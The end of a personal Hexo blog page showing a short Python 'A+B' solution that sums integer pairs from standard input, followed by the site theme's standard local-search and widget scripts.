          <a href="#A-B" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-B" class="headerlink" title="A+B"></a>A+B</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221012121808388.png" alt="image-20221012121808388"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    line = sys.stdin.readline()</span><br><span class="line">    <span class="keyword">if</span> line == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    line = line.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">int</span>(line[<span class="number">0</span>])+<span class="built_in">int</span>(line[<span class="number">1</span>].replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)))</span><br></pre></td></tr></table></div></figure>






        <h1 id="总结"   >
          <a href="#总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结" class="headerlink" title="总结"></a>总结</h1>
      </div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/2/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">134</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">86</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">75</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ Untitled ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', 'Please enter characters');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>